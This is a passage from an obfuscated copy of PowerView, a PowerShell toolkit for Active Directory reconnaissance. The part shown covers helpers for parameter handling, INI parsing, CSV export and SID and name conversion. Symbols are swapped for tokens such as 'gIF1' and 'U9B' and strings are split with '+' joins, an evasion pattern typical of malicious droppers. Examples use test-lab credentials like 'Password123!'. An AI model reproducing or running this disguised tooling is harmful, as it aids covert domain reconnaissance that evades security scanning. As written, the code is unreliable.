                            if(gIF1_.Value.PSobject.Methods.Name -match 41a^EqualsgIF141a) {
                                # If object has Equals, compare bound key and variable using it
                                if(!gIF1_.Value.Equals((Get-Variable -Name gIF1_.Key -ValueOnly -Scope 0))) {
                                    gIF1_.Key
                                }
                            }
                            else {
                                # If object doesn41at has Equals (e.g. gIF1null), fallback to the PowerShell41as -ne operator
                                if(gIF1_.Value -ne (Get-Variable -Name gIF1_.Key -ValueOnly -Scope 0)) {
                                    gIF1_.Key
                                }
                            }
                        }
            if(gIF1StaleKeys) {
                gIF1StaleKeys U9B ForEach-Object {[void]gIF1PSBoundParameters.Remove(gIF1_)}
            }

            # Since we rely solely on gIF1PSBoundParameters, we don41at have access to default values for unbound parameters
            gIF1UnboundParameters = (Get-Command -N'+'ame (gIF1PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  U9B
                                        # Find parameters that are belong to the current parameter set
                                        Where-Object { gIF1_.Value.ParameterSets.Keys -contains gIF1PsCmdlet.ParameterSetName } U9B
                                            Select-Object -ExpandProperty Key U9B
                                                # Find unbound parameters in the current parameter set
                                                Where-Object { gIF1PSBoundParameters.Keys -notcontains gIF1_ }

            # Even if parameter is not bound, corresponding variable is created with param'+'eter41as default value (if specified)
            gIF1tmp = gIF1null
            ForEach (gIF1Parameter in gIF1UnboundParameters) {
                gIF1DefaultValue = Get-Variable -Name gIF1Parameter -ValueOnly -Scope 0
                if(!gIF1PSBoundParameters.TryGetValue(gIF1Parameter, [ref]gIF'+'1tmp) -and gIF1DefaultValue) {
                    gIF1PSBoundParameters.gIF1Parameter = gIF1DefaultValue
                }
            }

            if(gIF1Dictionary) {
                gIF1DPDictionary = gIF1Dictionary
            }
            else {
                gIF1DPDictionary = gIF1InternalDictionary
            }

            # Shortcut for getting local variables
            gIF1GetVar = {Get-Variable -Name gIF1_ -ValueOnly -Scope 0}

            # Strings to match attributes and validation arguments
            gIF1AttributeRegex = 41a^(MandatoryU9BPositionU9BParameterSetNameU9BDontShowU9BHelpMessageU9BValueFromPipelineU9BValueFromPipelineByPropertyNameU9BValueFromRemainingArguments)gIF141a
            gIF1ValidationRegex = 41a^(AllowNullU9BAllowEmptyStringU9BAllowEmptyCollectionU9BValidateCountU9BValidateLengthU9BValidatePatternU9BValidateRangeU9BValidateScriptU9BValidateSetU9BValidateNotNullU9BValidateNotNullOrEmpty)gIF141a
            gIF1AliasRegex = 41a^AliasgIF141a
            gIF1ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex (gIF1PSBoundParameters.Keys) {
                gIF1AttributeRegex {
                    Try {
                        gIF1ParameterAttribute.gIF1_ = . gIF1GetVar
                    }
                    Catch {
                        gIF1_
                    }
                    continue
                }
            }

            if(gIF1DPDictionary.Keys -contains gIF1Name) {
                gIF1DPDictionary.gIF1Name.Attributes.Add(gIF1ParameterAttribute)
            }
            else {
                gIF1AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex (gIF1PSBoundParameters.Keys) {
                    gIF1ValidationRegex {
                        Try {
                            gIF1ParameterOptions = New-Object -TypeName ZfrSystem.Management.Automation.gIF1{_}AttributeZfr -ArgumentList (. gIF1GetVar) -ErrorAction Stop
                            gIF1AttributeCollection.Add(gIF1ParameterOptions)
                        }
                        Catch { gIF1_ }
                        continue
                    }
                    gIF1AliasRegex {
                        Try {
                            gIF1ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. gIF1GetVar) -ErrorAction Stop
                            gIF1AttributeCollection.Add(gIF1ParameterAlias)
                            continue
                        }
                        Catch { gIF1_ }
               '+'     }
                }
                gIF1AttributeCollection.Add(gIF1ParameterAttribute)
                gIF1Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @(gIF1Name, gIF1Type, gIF1AttributeCollection)
                gIF1DPDictionary.Add(gIF1Name, gIF1Parameter)
            }
        }
    }

    End {
        if(!gIF1CreateVariables -and !gIF1Dictionary) {
            gIF1DPDictionary
        }
    }
}


function Get-IniContent {
<#
'+'
.SYNOPSIS

This helper parses an .ini file into a hashtable.

Author: 41aThe Scripting Guys41a
Modifications: @harmj0y (-Credential support)
License: BSD 3-Clause
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection

.DESCRIPTION

Parses an .ini file into a hashtable. If -Credential is supplied,
then Add-RemoteConnection is used to map YwWYwWCOMPUTERNAMEYwWIPCgIF1, the file
is parsed, and then the connection is destroyed with Remove-RemoteConnection.

.PARAMETER Path

Specifies the path to the .ini file to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-IniContent C:YwWWindowsYwWexample.ini

.EXAMPLE

ZfrC:YwWWindowsYwWexample.iniZfr U9B Get-IniContent -OutputObject

Outputs the .ini details as a proper nested PSObject.

.EXAMPLE

ZfrC:YwWWindowsYwWexample.iniZfr U9B Get-IniContent

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-IniContent -Path YwWYwWPRIMARY.testlab.localYwWCgIF1YwWTempYwWGptTmpl.inf -Credential gIF1Cred

.INPUTS

String

Accepts one or more .ini paths on the pipeline.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed .ini file.

.LINK

https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aFullName41a, 41aName41a)]
        [Va'+'lidateNotNullOrEmpty()]
        [String[]]
        gIF1Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1OutputObject
    )

    BEGIN {
        gIF1MappedComputers = @{}
    }

    PROCESS {
        ForEach (gIF1TargetPath in gIF1Path) {
            if ((gIF1TargetPath -Match 41aYwWYwWYwWYwW.*YwWYwW.*41a) -and (gIF1PSBoundParameters[41aCredential41a])) {
                gIF1HostComputer = (New-Object System.Uri(gIF1TargetPath)).Host
                if (-not gIF1MappedComputers[gIF1HostComputer])'+' {
                    # map IPCgIF1 to this computer if it41as not already
                    Add-RemoteConnection -ComputerName gIF1HostComputer -Credential gIF1Credential
                    gIF1MappedComputers[gIF1HostComputer] = gIF1True
                }
            }

            if (Test-Path -Path gIF1TargetPath) {
                if (gIF1PSBoundParameters[41aOutputObject41a]) {
                    gIF1IniObject = New-Object PSObject
                }
                else {
                    gIF1IniObject = @{}
                }
                Switch -Regex -File gIF1TargetPath {
                    Zfr^YwW[(.+)YwW]Zfr # Section
                    {
                        gIF1Section = gIF1matches[1].Trim()
                        if (gIF1PSBoundParameters[41aOutputObject41a]) {
                            gIF1Section = gIF1Section.Replace(41a 41a, 41a41a)
                            gIF1SectionObject = New-Object PSObject
                            gIF1IniObject U9B Add-Member Noteproperty gIF1Section gIF1SectionObject
                        }
                        else {
                            gIF1IniObject[gIF1Section] = @{}
                        }
                        gIF1CommentCount = 0
                    }
                    Zfr^(;.*)gIF1Zfr # Comment
                    {
                        gIF1Value = gIF1matches[1].Trim()
                        gIF1CommentCount = gIF1CommentCount + 1
                        gIF1Name = 41aComment41a + gIF1CommentCount
                        if (gIF1PSBoundParameters[41aOutputObject41a]) {
                            gIF1Name = gIF1Name.Replace(41a 41a, 41a41a)
                            gIF1IniObject.gIF1Section U9B Add-Mem'+'ber Noteproperty gIF1Name gIF1Value
                        }
                        else {
                            gIF1IniObject[gIF1Section][gIF1Name] = gIF1Value
                        }
                    }
                    Zfr(.+?)YwWs*=(.*)Zfr # Key
                    {
                        gIF1Name, gIF1Value = gIF1matches[1..2]
                        gIF1Name = gIF1Name.Trim()
                        gIF1Values = gIF1Value.split(41a,41a) U9B ForEach-Object { gIF1_.Trim() }

                        # if (gIF1Values -isnot [System.Array]) { gIF1Values = @(gIF1Values) }

                        if (gIF1PSBoundParameters[41aOutputObject41a]) {
                            gIF1Name = gIF1Name.Replace(41a 41a, 41a41a)
                            gIF1IniObject.gIF1Section U9B Add-Member Noteproperty gIF1Name gIF1Values
                        }
                        else {
                            gIF1IniObject[gIF1Section][gIF1Name] = gIF1Values
                        }
                    }
                }
                gIF1IniObject
            }
        }
    }

    END {
        # remove the IPCgIF1 mappings
        gIF1MappedComputers.Keys U9B Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {
<#
.SYNOPSIS

Converts objects into a series of comma-separated (CSV) strings and saves the
strings in a CSV file in a thread-safe manner.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This helper exports an -InputObject to a .csv in a thread-safe manner
using a mutex. This is so the various multi-threaded functions in
PowerView has a thread-safe way to export output to the same file.
Uses .NET IO.FileStream/IO.StreamWriter objects for speed.

Originally based on Dmitry Sotnikov41as Export-CSV code: http://poshcode.org/1590

.PARAMETER InputObject

Specifies the objects to export as CSV strings.

.PARAMETER Path

Specifies the path to the CSV output file.

.PARAMETER Delimiter

Specifies a delimiter to separate the property values. The default is a comma (,)

.PARAMETER Append

Indicates that this cmdlet adds the CSV output to the end of the specified file.
Without this parameter, Export-PowerViewCSV replaces the file contents without warning.

.EXAMPLE

Get-DomainUser U9B Export-PowerViewCSV -Path Zfrusers.csvZfr

.EXAMPLE

Get-DomainUser U9B Export-PowerViewCSV -Path Zfrusers.csvZfr -Append -Delimiter 41aU9B41a

.INPUTS

PSObject

Accepts one or more PSObjects on the pipeline.

.LINK

http://poshcode.org/1590
http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [System.Management.Automation.PSObject[]]
        gIF1InputObject,

      '+'  [Parameter(Mandatory = gIF1True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        gIF1Delimiter = 41a,41a,

        [Switch]
        gIF1Append
    )

    BEGIN {
        gIF1OutputPath = [IO.Path]::GetFullPath(gIF1PSBoundParameters[41aPath41a])
        gIF1Exists = [System.IO.File]::Exists(gIF1OutputPath)

        # mutex so threaded code doesn41at stomp on the output file
        gIF1Mutex = New-Object System.Threading.Mutex gIF1False,41aCSVMutex41a
        gIF1Null = gIF1Mutex.WaitOne()

        if (gIF1PSBoundParameters[41aAppend41a]) {
            gIF1FileMode = [System.IO.FileMode]::Append
        }
        else {
            gIF1FileMode = [System.IO.FileMode]::Create
    '+'        gIF1Exists = gIF1False
        }

        gIF1CSVStream = New-Object IO.FileStream(gIF1OutputPath, gIF1FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        gIF1CSVWriter = New-Object System.IO.StreamWriter(gIF1CSVStream)
        gIF1CSVWriter.AutoFlush = gIF1True
    }

    PROCESS {
        ForEach (gIF1Entry in gIF1InputObject) {
            gIF1ObjectCSV = ConvertTo-Csv -InputObject gIF1Entry -Delimiter gIF1Delimiter -NoTypeInformation

            if (-not gIF1Exists) {
                # output the object field names as well
                gIF1ObjectCSV U9B ForEach-Object { gIF1CSVWriter.WriteLine(gIF1_) }
                gIF1Exists = gIF1True
            }
            else {
                # only output object field data
                gIF1ObjectCSV[1..(gIF1ObjectCSV.Length-1)] U9B ForEach-Object { gIF1CSVWriter.WriteLine(gIF1_) }
            }
        }
    }

    END {
        gIF1Mutex.ReleaseMutex()
        gIF1CSVWriter.Dispose()
        gIF1CSVStream.Dispose()
    }
}


function Resolve-IPAddress {
<#
.SYN'+'OPSIS

Resolves a given hostename to its associated IPv4 address.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Resolves a given hostename to its associated IPv4 address using
[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
is the IP address of the localhost.

.EXAMPLE

Resolve-IPAddress -ComputerName SERVER

.EXAMPLE

@(ZfrSERVER1Zfr, ZfrSERVER2Zfr) U9B Resolve-IPAddress

.INPUTS

String

Accepts one or more IP address strings on the pipeline.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with the ComputerName and IPAddress.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aSystem.Management.Automation.PSCustomObject41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = gIF1Env:COMPUTERNAME
    )

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry(gIF1Computer)).AddressList) U9B ForEach-Object {
                    if (gIF1_.AddressFamily -eq 41aInterNetwork41a) {
                        gIF1Out = New-Object PSObject
                        gIF1Out U9B Add-Member Noteproperty 41aComputerN'+'ame41a gIF1Computer
                        gIF1Out U9B Add-Member Noteproperty 41aIPAddress41a gIF1_.IPAddressToString
                        gIF1Out
                    }
                }
            }
            catch {
                Write-Verbose Zfr[Resolve-IPAddress] Could not resolve gIF1Computer to an IP Address.Zfr
            }
        }
    }
}


function ConvertTo-SID {
<#
.SYNOPSIS

Converts a given user/group name to a security identifier (SID).

Author: Will Schroeder (@harmj0y)  
License:'+' BSD 3-Clause  
Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  

.DESCRIPTION

Converts a ZfrDOMAINYwWusernameZfr syntax to a security identifier (SID)
using System.Security.Principal.NTAccount41as translate function. If alternate
credentials are supplied, then Get-ADObject is used to try to map the name
to a security identifier.

.PARAMETER ObjectName

The user/group name to convert, can be 41auser41a or 41aDOMAINYwWuser41a format.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertTo-SID 41aDEVYwWdfm41a

.EXAMPLE

41aDEVYwWdfm41a,41aDEVYwWkrbtgt41a U9B ConvertTo-SID

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
41aTESTLABYwWdfm41a U9B ConvertTo-SID -Credential gIF1Cred

.INPUTS

String

Accepts one or more username specification strings on the pipeline.

.OUTPUTS

String

A string representing the SID of the translated name.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a, 41aIdentity41a)]
        [String[]]
        gIF1ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Ma'+'nagement.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1DomainSearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1DomainSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1DomainSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1DomainSearcherArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        ForEach (gIF1Object in gIF1ObjectName) {
            gIF1Object = gIF1Object -Replace 41a/41a,41aYwW41a

            if (gIF1PSBoundParameters[41aCredential41a]) {
                gIF1DN = Convert-ADName -Identity gIF1Object -OutputType 41aDN41a @DomainSearcherArguments
                if (gIF1DN) {
                    gIF1UserDomain = gIF1DN.SubString(gIF1DN.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                    gIF1UserName = gIF1DN.Split(41a,41a)[0].split(41a=41a)[1]

                    gIF1DomainSearcherArguments[41aIdentity41a] = gIF1UserName
                    gIF1DomainSearcherArguments[41aDomain41a] = gIF1UserDomain
                    gIF1DomainSearcherArguments[41aProperties41a] = 41aobjectsid41a
                    Get-DomainObject @DomainSearcherArguments U9B Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if (gIF1Object.Contains(41aYwW41a)) {
                        gIF1Domain = gIF1Object.Split(41aYwW41a)[0]
                        gIF1Object = gIF1Object.Split(41aYwW41a)[1]
                    }
                    elseif (-not gIF1PSBoundParameters[41aDomain41a]) {
                        gIF1DomainSearcherArguments = @{}
                        gIF1Domain = (Get-Domain @DomainSearcher'+'Arguments).Name
                    }

                    gIF1Obj = (New-Object System.Security.Principal.NTAccount(gIF1Domain, gIF1Object))
                    gIF1Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose Zfr[ConvertTo-SID] Error converting gIF1DomainYwWgIF1Object : gIF1_Zfr
                }
            }
        }
    }
}


function ConvertFrom-SID {
<#
.SYNOPSIS

Conve'+'rts a security identifier (SID) to a group/user name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName  

.DESCRIPTION

Converts a security identifier string (SID) to a group/user name
using Convert-ADName.

.PARAMETER ObjectSid

Specifies one or more SIDs to convert.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertFrom-SID S-1-5-21-890171859-34338092'+'79-3366196753-1108

TESTLABYwWharmj0y

.EXAMPLE

ZfrS-1-5-21-890171859-3433809279-3366196753-1107Zfr, ZfrS-1-5-21-890171859-3433809279-3366196753-1108Zfr, ZfrS-1-5-32-562Zfr U9B ConvertFrom-SID

TESTLABYwWWINDOWS2gIF1
TESTLABYwWharmj0y
BUILTINYwWDistributed COM Users

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm41a, gIF1SecPassword)
ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential gIF1Cred

TESTLABYwWharmj0y

.INPUTS

String

Accepts one or more SID strings on the pipeline.

.OUTPUTS

String

The converted DOMAINYwWusername.
#>

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aSID41a)]
        [ValidatePattern(41a^S-1-.*41a)]
        [String[]]
        gIF1ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1ADNameArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ADNameArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ADNameArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ADNameArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        ForEach (gIF1TargetSid in gIF1ObjectSid) {
            gIF1TargetSid = gIF1TargetSid.trim(41a*41a)
            try {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch (gIF1TargetSid) {
                    41aS-1-041a         { 41aNull Authority41a }
                    41aS-1-0-041a       { 41aNobody41a }
                    41aS-1-141a         { 41aWorld Authority41a }
                    41aS-1-1-041a       { 41aEveryone41a }
                    41aS-1-241a         { 41aLocal Authority41a }
                    41aS-1-2-041a       { 41aLocal41a }
                    41aS-1-2-141a       { 41aConsole Logon 41a }
                    41aS-1-341a         { 41aCreator Authority41a }
                    41aS-1-3-041a       { 41aCreator Owner41a }
                    41aS-1-3-141a       { 41aCreator Group41a }
                    41aS-1-3-241a       { 41aCreator Owner Server41a }
                    41aS-1-3-341a       { 41aCreator Group Server41a }
                    41aS-1-3-441a       { 41aOwner Rights41a }
                    41aS-1-441a         { 41aNon-unique Authority41a }
                    41aS-1-541a         { 41aNT Authority41a }
                    41aS-1-5-141a       { 41aDialup41a }
                    41aS-1-5-241a       { 41aNetwork41a }
                    41aS-1-5-341a       { 41aBatch41a }
                    41aS-1-5-441a       { 41aInteractive41a }
                    41aS-1-5-641a       { 41aService41a }
                    41aS-1-5-741a       { 41aAnonymous41a }
                    41aS-1-5-841a       { 41aProxy41a }
                    41aS-1-5-941a       { 41aEnterprise Domain Controllers41a }
                    41aS-1-5-1041a      { 41aPrincipal Self41a }
                    41aS-1-5-1141a      { 41aAuthenticated Users41a }
                    41aS-1-5-1241a      { 41aRestricted Code41a }
                    41aS-1-5-1341a      { 41aTerminal Server Users41a }
                    41aS-1-5-1441a      { 41aRemote Interactive Logon41a }
                    41aS-1-5-1541a      { 41aThis Organization 41a }
                    41aS-1-5-1741a      { 41aThis Organization 41a }
                    41aS-1-5-1841a      { 41aLocal System41a }
                    41aS-1-5-1941a      { 41aNT Authority41a }
                    41aS-1-5-2041a      { 41aNT Authority41a }
                    41aS-1-5-80-041a    { 41aAll Services 41a }
                    41aS-1-5-32-54441a  { 41aBUILTINYwWAdministrators41a }
                    41aS-1-5-32-54541a  { 41aBUILTINYwWUsers41a }
                    41aS-1-5-32-54641a  { 41aBUILTINYwWGuests41a }
                    41aS-1-5-32-54741a  { 41aBUILTINYwWPower Users41a }
                    41aS-1-5-32-54841a  { 41aBUILTINYwWAccount Operators41a }
                    41aS-1-5-32-54941a  { 41aBUILTINYwWServer Operators41a }
                    41aS-1-5-32-55041a  { 41aBUILTINYwWPrint Operators41a }
                    41aS-1-5-32-55141a  { 41aBUILTINYwWBackup Operators41a }
                    41aS-1-5-32-55241a  { 41aBUILTINYwWReplicators41a }
                    41aS-1-5-32-55441a  { 41aBUILTINYwWPre-Windows 2000 Compatible Access41a }
                    41aS-1-5-32-55541a  { 41aBUILTINYwWRemote Desktop Users41a }
                    41aS-1-5-32-55641a  { 41aBUILTINYwWNetwor'+'k Configuration Operators41a }
                    41aS-1-5-32-55741a  { 41aBUILTINYwWIncoming Forest Trust Builders41a }
                    41aS-1-5-32-55841a  { 41aBUILTINYwWPerformance Monitor Users41a }
                    41aS-1-5-32-55941a  { 41aBUILTINYwWPerformance Log Users41a }
                    41aS-1-5-32-56041a  { 41aBUILTINYwWWindows Authorization Access Group41a }
                    41aS-1-5-32-56141a  { 41aBUILTINYwWTerminal Server License Servers41a }
                    41aS-1-5-32-56241a  { 41aBUILTINYwWDistributed COM Users41a }
                    41aS-1-5-32-56941a  { 41aBUILTINYwWCryptographic Operators41a }
                    41aS-1-5-32-57341a  { 41aBUILTINYwWEvent Log Readers41a }
                    41aS-1-5-32-57441a  { 41aBUILTINYwWCertificate Service DCOM Access41a }
                    41aS-1-5-32-57541a  { 41aBUILTINYwWRDS Remote Access Servers41a }
                    41aS-1-5-32-57641a  { 41aBUILTINYwWRDS Endpoint Servers41a }
                    41aS-1-5-32-57741a  { 41aBUILTINYwWRDS Management Servers41a }
                    41aS-1-5-32-57841a  { 41aBUILTINYwWHyper-V Administrators41a }
                    41aS-1-5-32-57941a  { 41aBUILTINYwWAccess Control Assistance Operators41a }
                    41aS-1-5-32-58041a  { 41aBUILTINYwWAccess Control Assistance Operators41a }
                    Default {
                        Convert-ADName -Identity gIF1TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose Zfr[ConvertFrom-SID] Error converting SID 41agIF1TargetSid41a : gIF1_Zfr
            }
        }
    }
}


function Convert-ADName {
<#
.SYNOPSIS

Converts Active Directory object names between a variety of formats.

Author: Bill Stewart, Pasquale Lantella  
Modifications: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function is heavily based on Bill Stewart41as code and Pasquale Lantella41as code (in LINK)
and translates Active Directory names between various formats using the NameTranslate COM object.

.PARAMETER Identity

Specifies the Active Directory object name to translate, of the fol'+'lowing form:

    DN                short for 41adistinguished name41a; e.g., 41aCN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com41a
    Canonical         canonical name; e.g., 41afabrikam.com/Engineers/Phineas Flynn41a
    NT4               domainYwWusername; e.g., 41afabrikamYwWpflynn41a
    Display           display name, e.g. 41apflynn41a
    DomainSimple      simple domain name format, e.g. 41apflynn@fabrikam.com41a
    EnterpriseSimple  simple enterprise name format, e.g. 41apflynn@fabrikam.com41a
    GUID              GUID; e.g., 41a{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}41a
    UPN               user principal name; e.g., 41apflynn@fabrikam.com41a
    CanonicalEx       extended canonical name format
    SPN               service principal name format; e.g. 41aHTTP/kairomac.contoso.com41a
    SID               Security Identifier; e.g., 41aS-1-5-21-12986231-600641547-709122288-5799941a

.PARAMETER OutputType

Specifies the output name type you want to convert to, which must be one of the following:

    DN                short for 41adistinguished name41a; e.g., 41aCN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com41a
    Canonical         canonical name; e.g., 41afabrikam.com/Engineers/Phineas Flynn41a
    NT4               domainYwWusername; e.g., 41afabrikamYwWpflynn41a
    Display           display name, e.g. 41apflynn41a
    DomainSimple      simple domain name format, e.g. 41apflynn@fabrikam.com41a
    EnterpriseSimple  simple enterprise name format, e.g. 41apflynn@fabrikam.com41a
    GUID              GUID; e.g., 41a{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}41a
    UPN               user principal name; e.g., 41apflynn@fabrikam.com41a
    CanonicalEx       extended canonical name format, e.g. 41afabrikam.com/Users/Phineas Flynn41a
    SPN               service principal name format; e.g. 41aHTTP/kairomac.contoso.com41a

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

Convert-ADName -Identity ZfrTESTLABYwWharmj0yZfr

harmj0y@testlab.local

.EXAMPLE

ZfrTESTLABYwWkrbtgtZfr, ZfrCN=Administrator,CN=Users,DC=testlab,DC=localZfr U9B Convert-ADName -OutputType Canonical

testlab.local/Users/krbtgt
testlab.local/Users/Administrator

.EXAMPLE

Convert-ADName -OutputType dn -Identity 41aTESTLABYwWharmj0y41a -Server PRIMARY.testlab.local

CN=harmj0y,CN=Users,DC=testlab,DC=local

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm41a, gIF1SecPassword)
41aS-1-5-21-890171859-3433809279-3366196753-110841a U9B Convert-ADNAme -Credential gIF1Cred

TESTLABYwWharmj0y

.INPUTS

String

Accepts one or more objects name strings on the pipeline.

.OUTPUTS

String

Outputs a string representing the converted name.

.LINK

http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPro'+'pertyName = gIF1True)]
        [Alias(41aName41a, 41aObjectName41a)]
        [String[]]
        gIF1Identity,

        [String]
        [ValidateSet(41aDN41a, 41aCanonical41a, 41aNT441a, 41aDisplay41a, 41aDomainSimple41a, 41aEnterpriseSimple41a, 41aGUID41a, 41aUnknown41a, 41aUPN41a, 41aCanonicalEx41a, 41aSPN41a)]
        gIF1OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1NameTypes = @{
            41aDN41a                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            41aCanonical41a         =   2  # fabrikam.com/Engineers/Phineas Flynn
            41aNT441a               =   3  # fabrikamYwWpflynn
            41aDisplay41a           =   4  # pflynn
            41aDomainSimple41a      =   5  # pflynn@fabrikam.com
            41aEnterpriseSimple41a  =   6  # pflynn@fabrikam.com
            41aGUID41a              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            41aUnknown41a           =   8  # unknown type - let the server do translation
            41aUPN41a               =   9  # pflynn@fabrikam.com
            41aCanonicalEx41a       =   10 # fabrikam.com/Users/Phineas Flynn
